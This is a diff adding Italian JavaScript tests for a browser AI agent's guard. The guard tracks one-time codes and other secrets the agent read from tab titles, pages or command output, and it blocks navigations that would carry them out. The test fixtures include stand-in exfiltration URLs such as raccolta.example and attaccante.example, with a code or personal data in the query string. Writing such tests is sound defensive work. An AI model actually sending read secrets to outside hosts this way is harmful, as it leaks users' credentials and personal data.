@@ -515,6 +515,62 @@ describe('una pagina piena di codici finti nascosti non nasconde quello vero', (
   });
 });
 
+describe('quello che da fuori arriva a un modello conta come letto, per qualunque strada e dopo un riavvio', () => {
+  require(join(ROOT, 'src', 'shared', 'contenutoEsterno.js'));
+  const E = globalThis.SN_ESTERNO;
+  const nav = { type: 'NAVIGA', url: 'https://raccolta.example/c?v=482913' };
+  const deposito = () => {
+    const d = { testo: null, leggi: () => d.testo, scrivi: (t) => { d.testo = t; } };
+    return d;
+  };
+
+  test('un codice nel titolo di una scheda, dentro la sua busta, ferma l’uscita; memoria e conversazioni archiviate no', () => {
+    SL.usaDeposito(null);
+    const titoli = E.imbusta({ tipo: 'DATI_PAGINA', testo: '1. Il tuo codice monouso è 482913 - Posta' });
+    const memoria = E.imbusta({ tipo: 'MEMORIA_FILO', testo: 'Il codice monouso della palestra è 771234', conIntestazione: true });
+    const archivio = E.imbustaCampi({ tipo: 'CONVERSAZIONE_ARCHIVIATA', corpo: 'Filo: ti propongo la password: Tr7kq29Lm' });
+    SL.ricordaBuste([{ role: 'system', content: `TAB APERTE\n${titoli}\n${memoria}` }, { role: 'user', content: [{ type: 'text', text: archivio }] }]);
+    const letti = SL.tutti();
+    assert.deepEqual(letti.map((x) => x.valore), ['482913']);
+    assert.equal(X.valutaUscita(nav, { letti }).frase, "non ho aperto l'indirizzo: conteneva un codice letto da una pagina");
+    assert.equal(X.valutaUscita(nav, { letti, parole: 'usa il codice 482913' }).blocca, false);
+  });
+
+  test('il cancello dei modelli consegna ogni messaggio a chi ricorda il contenuto esterno', async () => {
+    const visti = [];
+    globalThis.SN_PROVIDERS = {
+      completeWithFallback: async () => ({ text: 'ok', usage: {} }),
+      streamCompleteWithFallback: async () => ({ text: 'ok', usage: {} }),
+      getProvider: () => null,
+    };
+    const gate = globalThis.SN_MODEL_GATE.create({
+      getSettings: async () => ({}),
+      buildChain: () => [{ provider: 'openrouter', apiKey: 'k', model: 'm' }],
+      modelFor: () => 'm',
+      costs: { isOverLimit: async () => false, record: async () => 0 },
+      ricordaEsterni: (m) => visti.push(m),
+    });
+    const messages = [{ role: 'user', content: 'ciao' }];
+    await gate.complete({ action: 'x', messages });
+    await gate.stream({ action: 'x', messages });
+    assert.deepEqual(visti, [messages, messages]);
+    assert.ok(/ricordaEsterni:\s*\(messages\)\s*=>\s*SegretiLetti\.ricordaBuste\(messages\)/.test(handlers), 'il cancello di Filo non ricorda il contenuto esterno');
+  });
+
+  test('i segreti letti tornano dopo un riavvio, finché non sono più vecchi del ricordo', () => {
+    const d = deposito();
+    SL.usaDeposito(d);
+    SL.ricorda('Il tuo codice monouso è 482913', "dall'output di un comando");
+    SL.svuota();
+    assert.deepEqual(SL.tutti(), [{ valore: '482913', regola: 'codice', fonte: "dall'output di un comando" }]);
+    const vecchio = Date.now() - (SL.GIORNI_RICORDO + 1) * 24 * 3600 * 1000;
+    d.testo = JSON.stringify(JSON.parse(d.testo).map((x) => ({ ...x, at: vecchio })));
+    SL.svuota();
+    assert.deepEqual(SL.tutti(), []);
+    SL.usaDeposito(null);
+  });
+});
+
 describe('il resto del verdetto resta quello di #587', () => {
   test('NAVIGA con un dato della memoria chiede un OK, non si ferma', () => {
     const v = X.valutaUscita({ type: 'NAVIGA', url: 'https://attaccante.example/c?d=Mario_Rossi_Bologna' }, {
